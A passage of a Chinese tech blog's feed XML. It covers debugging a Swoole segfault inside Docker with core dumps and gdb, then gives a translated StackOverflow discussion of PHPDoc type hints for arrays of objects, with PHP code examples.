class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">int</span>* p = <span class="literal">NULL</span>;  </span><br><span class="line">  *p = <span class="number">10</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb a.out core</span><br></pre></td></tr></table></figure><h4 id="5-修改core文件命名"><a href="#5-修改core文件命名" class="headerlink" title="5. 修改core文件命名"></a>5. 修改core文件命名</h4><p>坑爹的是, 项目里根目录恰好有个Core文件夹,我的mac硬盘分区给的又是大小写不敏感, GG, 改一波命名..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'core.%e.%p'</span> &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天在计划写一个爬虫脚本时, 由于涉及到html的浏览器渲染, 干脆用就用浏览器和控制台运行js脚本来作为爬虫工具, chrome支持ES6语法(有些需要在dev设置中开启), 写起来也是十分舒服, 爬完数据并处理过后通过xhr扔给后端服务器即可, 后端是用Swoole负责接收并向数据库进行大文本插入, 不幸的是在这时候错误出现了.&lt;/p&gt;
&lt;p&gt;在数千个请求后nginx代理的后端挂掉了,返回了502BadGateWay,肯定要去上游找原因了,由于swoole是跑在docker容器中的, 于是马上查看容器日志&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ docker logs custed_swoole_1 --tail 100&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到如下报错&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ WARNING	swProcessPool_wait: worker&lt;span class=&quot;comment&quot;&gt;#0 abnormal exit, status=0, signal=11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;google了一下没找到相关问题, 只能请教rango, 说是signal11是coredump了, 让我抓一下core文件&lt;/p&gt;
&lt;p&gt;然后就开始踩坑了, 我的服务是运行在docker中的, docker里要抓core文件需要一波操作了…&lt;/p&gt;
&lt;p&gt;废话不多说直接总结一下坑&lt;/p&gt;
&lt;h4 id=&quot;1-开启容器特权&quot;&gt;&lt;a href=&quot;#1-开启容器特权&quot; class=&quot;headerlink&quot; title=&quot;1. 开启容器特权&quot;&gt;&lt;/a&gt;1. 开启容器特权&lt;/h4&gt;&lt;p&gt;没有特权模式, 容器里就无法使用gdb调试&lt;/p&gt;
&lt;p&gt;我用的是docker-compose 所以配置里需要加这么一行&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;privileged:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果是run的话, 加:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;--privileged&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="coredump" scheme="http://www.twosee.cn/tags/coredump/"/>
    
      <category term="docker" scheme="http://www.twosee.cn/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>[译] PHPDoc类型提示数组的对象</title>
    <link href="http://www.twosee.cn/2018/01/28/PHPDoc-type-hinting-for-array-of-objects/"/>
    <id>http://www.twosee.cn/2018/01/28/PHPDoc-type-hinting-for-array-of-objects/</id>
    <published>2018-01-28T13:28:29.000Z</published>
    <updated>2018-05-12T03:20:11.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>因此，在PHPDoc中，可以在成员变量声明之上指定<code>@var</code>来提示其类型。然后一个IDE，例如PHPEd将知道它正在使用什么类型的对象，并且能够为该变量提供代码洞察。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="comment">/** <span class="doctag">@var</span> SomeObj */</span></span><br><span class="line"> <span class="keyword">private</span> $someObjInstance;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这样做很好，直到我需要对一组对象做同样的事情，以便在以后迭代这些对象时才能获得正确的提示。</p><p>那么，有没有办法声明一个PHPDoc标签来指定成员变量是<code>SomeObj</code>的数组？ <code>@var</code>数组是不够的，例如<code>@var array(SomeObj)</code>似乎没有效果。</p><h2 id="最佳解决方案"><a href="#最佳解决方案" class="headerlink" title="最佳解决方案"></a>最佳解决方案</h2><p>在JetBrains的PhpStorm IDE中，您可以使用<code>/** @var SomeObj[] */</code>，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SomeObj[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSomeObjects</span><span class="params">()</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure><p><a href="https://segmentfault.com/link.php?target=http%3A//phpdoc.org/docs/latest/references/phpdoc/types.html%23arrays" target="_blank" rel="noopener">phpdoc documentation</a>推荐这种方法：</p><blockquote><p>specified containing a single type, the Type definition informs the reader of the type of each array element. Only one Type is then expected as element for a given array.</p><p>Example: <code>@return int[]</code></p></blockquote><a id="more"></a><h2 id="次佳解决方案"><a href="#次佳解决方案" class="headerlink" title="次佳解决方案"></a>次佳解决方案</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($Objs <span class="keyword">as</span> $Obj)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* <span class="doctag">@var</span> $Obj Test */</span></span><br><span class="line"> <span class="comment">// You should be able to get hinting after the preceding line if you type $Obj-&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我在Zend Studio中做了很多工作。不知道其他编辑，但它应该工作。</p><h2 id="第三种解决方案"><a href="#第三种解决方案" class="headerlink" title="第三种解决方案"></a>第三种解决方案</h2><p>Netbeans提示：</p><p>您可以在<code>$users[0]-&gt;</code>和<code>$this-&gt;</code>上获取用户类数组的代码完成。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> User[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $users = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure><p>当您完成<code>$this-&gt;...</code>时，您还可以看到类成员列表中的数组类型</p><h2 id="第四种方案"><a href="#第四种方案" class="headerlink" title="第四种方案"></a>第四种方案</h2><p>指定变量是一个对象数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$needles = getAllNeedles();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $needles Needle[] */</span></span><br><span class="line">$needles[<span class="number">1</span>]-&gt;... <span class="comment">//codehinting works</span></span><br></pre></td></tr></table></figure><p>这在Netbeans 7.2(我正在使用它)</p><p>还有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$needles = getAllNeedles();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $needles Needle[] */</span></span><br><span class="line"><span class="keyword">foreach</span> ($needles <span class="keyword">as</span> $needle) &#123;</span><br><span class="line"> $needle-&gt;... <span class="comment">//codehinting works</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此在<code>foreach</code>中使用声明是不必要的。</p><h2 id="第五种方案"><a href="#第五种方案" class="headerlink" title="第五种方案"></a>第五种方案</h2><p>我更喜欢阅读和编写干净的代码 – 如Robert C. Martin的”Clean Code”所述。当遵循他的信条时，您不应要求开发人员(作为您的API的用户)知道数组的(内部)结构。</p><p>API用户可能会问：这是仅一维的数组吗？物体是否在多维数组的各个层次上传播？我需要访问所有对象有多少个嵌套循环(foreach等)？什么类型的对象是该数组中的”stored”？</p><p>如您所概述的，您希望将该数组(其中包含对象)用作一维数组。</p><p>正如Nishi所概述的，你可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SomeObj[]</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>为了那个原因。</p><p>但再次：请注意 – 这不是一个标准的docblock符号。这种符号是由一些IDE生产者引入的。</p><p>好的，作为一名开发人员，您知道”[]”与PHP中的数组绑定。但是在正常的PHP上下文中”something[]”是什么意思？ “[]”意味着：在”something”中创建新元素。新的元素可以是一切。但是你想表达的是：具有相同类型的对象的数组，它的确切类型。您可以看到，IDE生产者引入了一个新的上下文。你必须学习的一个新的背景。 PHP开发人员必须学习的新环境(了解您的docblocks)。坏风格(！)。</p><p>因为你的数组确实有一个维度，你可能想要将这个“数组的对象”称为”list”。请注意，”list”在其他编程语言中具有非常特殊的意义。它会被更好地称为”collection”为例。</p><p>记住：您使用一种编程语言，可以为您提供OOP的所有选项。使用类而不是数组，并使类像数组一样遍历。例如。：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">orderCollection</span> <span class="keyword">implements</span> <span class="title">ArrayIterator</span></span></span><br></pre></td></tr></table></figure><p>或者如果要将内部对象存储在多维数组/对象结构中的不同级别上：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">orderCollection</span> <span class="keyword">implements</span> <span class="title">RecursiveArrayIterator</span></span></span><br></pre></td></tr></table></figure><p>此解决方案将使用”orderCollection”类型的对象替换您的数组，但是到目前为止，不能在IDE中启用代码完成。好的。下一步：</p><p>实现与docblock接口引入的方法 – 特别是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::current()</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> integer E.g. database identifier of the order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::key()</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::offsetGet()</span><br></pre></td></tr></table></figure><p>不要忘记使用类型提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orderCollection::append(Order $order)</span><br><span class="line">orderCollection::offsetSet(Order $order)</span><br></pre></td></tr></table></figure><p>这个解决方案停止引入很多：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@var</span> $key ... */</span></span><br><span class="line"><span class="comment">/** <span class="doctag">@var</span> $value ... */</span></span><br></pre></td></tr></table></figure><p>所有的代码文件(例如循环内)，因为Zahymaka证实了他/他的答案。您的API用户不会被迫引用该文档块，以使代码完成。要只在一个地方有@return可以减少冗余(@var)作为mutch尽可能的。使用@var“docBlocks”会使您的代码变得最不可读。</p><p>最后你完成了看起来很难看看起来像大锤打破一个坚果？不是真的，因为你熟悉那些接口和干净的代码。记住：你的源代码是一次写/读很多。</p><p>如果IDE的代码完成无法使用此方法，请切换到更好的(例如IntelliJ IDEA，PhpStorm，Netbeans)或在IDE生成器的问题跟踪器上提交功能请求。</p><p>感谢Christian Weiss(来自德国)担任我的教练，并教我如此伟大的东西。 PS：在邢会见我和他</p><h2 id="第六种方案"><a href="#第六种方案" class="headerlink" title="第六种方案"></a>第六种方案</h2><p><a href="https://segmentfault.com/link.php?target=https%3A//github.com/php-fig/fig-standards/blob/211063eed7f4d9b4514b728d7b1810d9b3379dd1/proposed/phpdoc.md%23collections" target="_blank" rel="noopener">PSR-5: PHPDoc</a>提出了一种形式的Generics-style表示法。</p><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type[]</span><br><span class="line">Type&lt;Type&gt;</span><br><span class="line">Type&lt;Type[, Type]...&gt;</span><br><span class="line">Type&lt;Type[|Type]...&gt;</span><br></pre></td></tr></table></figure><p>集合中的值可能甚至是另一个数组，甚至另一个集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type&lt;Type&lt;Type&gt;&gt;</span><br><span class="line">Type&lt;Type&lt;Type[, Type]...&gt;&gt;</span><br><span class="line">Type&lt;Type&lt;Type[|Type]...&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$x = [<span class="keyword">new</span> Name()];</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $x Name[] */</span></span><br><span class="line"></span><br><span class="line">$y = <span class="keyword">new</span> Collection([<span class="keyword">new</span> Name()]);</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $y Collection&lt;Name&gt; */</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Collection(); </span><br><span class="line">$a[] = <span class="keyword">new</span> Model_User(); </span><br><span class="line">$a-&gt;resetChanges(); </span><br><span class="line">$a[<span class="number">0</span>]-&gt;name = <span class="string">"George"</span>; </span><br><span class="line">$a-&gt;echoChanges();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $a Collection&lt;Model_User&gt; */</span></span><br></pre></td></tr></table></figure><p>注意：如果您期望IDE执行代码辅助，那么另一个问题是IDE是否支持PHPDoc Generic-style集合符号。</p><p>从我的答案到<a href="https://segmentfault.com/link.php?target=https%3A//stackoverflow.com/a/39384337/934739" target="_blank" rel="noopener">this question</a>。</p><h2 id="第七种方案"><a href="#第七种方案" class="headerlink" title="第七种方案"></a>第七种方案</h2><p>在NetBeans 7.0(也可能较低)中，您可以声明返回类型“具有文本对象的数组”，就像<code>@return Text</code>一样，并且代码提示将起作用：</p><p>编辑：使用@Bob Fanger建议更新示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * get all Tests</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Test|Array $tests</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllTexts</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">array</span>(<span class="keyword">new</span> Test(), <span class="keyword">new</span> Test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需使用它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$tests = $controller-&gt;getAllTests();</span><br><span class="line"><span class="comment">//$tests-&gt; //codehinting works!</span></span><br><span class="line"><span class="comment">//$tests[0]-&gt; //codehinting works!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($tests <span class="keyword">as</span> $text)&#123;</span><br><span class="line"> <span class="comment">//$test-&gt; //codehinting works!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它不是完美的，但最好只是离开它只是”mixed”，女巫没有带来价值。</p><p>CONS是你被允许以数组为背景，因为文本对象将会抛出错误。</p><h2 id="第八种方案"><a href="#第八种方案" class="headerlink" title="第八种方案"></a>第八种方案</h2><p><strong>在Zend Studio中使用array[type]。</strong></p><p>在Zend Studio中，<code>array[MyClass]</code>或<code>array[int]</code>甚至<code>array[array[MyClass]]</code>都很棒。</p><h2 id="第九种方案"><a href="#第九种方案" class="headerlink" title="第九种方案"></a>第九种方案</h2><p>正如DanielaWaranie在答案中提到的那样 – 当您在$ collectionObject中迭代$ items时，有一种方法来指定$ item的类型：将<code>@return MyEntitiesClassName</code>添加到<code>current()</code>以及返回值的<code>Iterator</code>和<code>Iterator</code>和<code>ArrayAccess</code>方法的其余部分。</p><p>繁荣！ <code>/** @var SomeObj[] $collectionObj */</code>不需要<code>foreach</code>，并且与收藏对象一起使用，无需以<code>@return SomeObj[]</code>描述的特定方法返回收藏。</p><p>我怀疑并不是所有的IDE都支持它，但它在PhpStorm中工作得很好，这让我更开心。</p><p><strong>例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">MyCollection</span> <span class="keyword">implements</span> <span class="title">Countable</span>, <span class="title">Iterator</span>, <span class="title">ArrayAccess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> User</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;items[<span class="keyword">$this</span>-&gt;cursor];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//... implement rest of the required `interface` methods and your custom</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="有什么有用的我会添加发布这个答案"><a href="#有什么有用的我会添加发布这个答案" class="headerlink" title="有什么有用的我会添加发布这个答案"></a>有什么有用的我会添加发布这个答案</h3><p>在我的情况下，<code>current()</code>和<code>interface</code>方法的其余部分在<code>Abstract</code> -collection类中实现，我不知道最终将在集合中存储什么样的实体。</p><p>所以这里是窍门：不要在抽象类中指定返回类型，而是在特定的集合类的描述中使用PhpDoc instuction <code>@method</code>。</p><p><strong>例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">printLogin</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;login;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Abstract</span> <span class="class"><span class="keyword">Class</span> <span class="title">MyCollection</span> <span class="keyword">implements</span> <span class="title">Countable</span>, <span class="title">Iterator</span>, <span class="title">ArrayAccess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> $items = [];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;items[<span class="keyword">$this</span>-&gt;cursor];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//... implement rest of the required `interface` methods and your custom</span></span><br><span class="line"> <span class="comment">//... abstract methods which will be shared among child-classes</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> User current()</span></span><br><span class="line"><span class="comment"> * ...rest of methods (for ArrayAccess) if needed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UserCollection</span> <span class="keyword">extends</span> <span class="title">MyCollection</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(User $user)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;items[] = $user;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// User collection specific methods...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，使用类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$collection = <span class="keyword">new</span> UserCollection();</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">1</span>));</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">2</span>));</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($collection <span class="keyword">as</span> $user) &#123;</span><br><span class="line"> <span class="comment">// IDE should `recognize` method `printLogin()` here!</span></span><br><span class="line"> $user-&gt;printLogin();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次：我怀疑并不是所有的IDE都支持它，而PhpStorm则是这样。尝试你的，发表评论结果！</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://stackoverflow.com/questions/778564/phpdoc-type-hinting-for-array-of-objects%3Fanswertab%3Dvotes" target="_blank" rel="noopener">PHPDoc type hinting for array of objects?</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h2&gt;&lt;p&gt;因此，在PHPDoc中，可以在成员变量声明之上指定&lt;code&gt;@var&lt;/code&gt;来提示其类型。然后一个IDE，例如PHPEd将知道它正在使用什么类型的对象，并且能够为该变量提供代码洞察。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Test&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;/** &lt;span class=&quot;doctag&quot;&gt;@var&lt;/span&gt; SomeObj */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $someObjInstance;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样做很好，直到我需要对一组对象做同样的事情，以便在以后迭代这些对象时才能获得正确的提示。&lt;/p&gt;
&lt;p&gt;那么，有没有办法声明一个PHPDoc标签来指定成员变量是&lt;code&gt;SomeObj&lt;/code&gt;的数组？ &lt;code&gt;@var&lt;/code&gt;数组是不够的，例如&lt;code&gt;@var array(SomeObj)&lt;/code&gt;似乎没有效果。&lt;/p&gt;
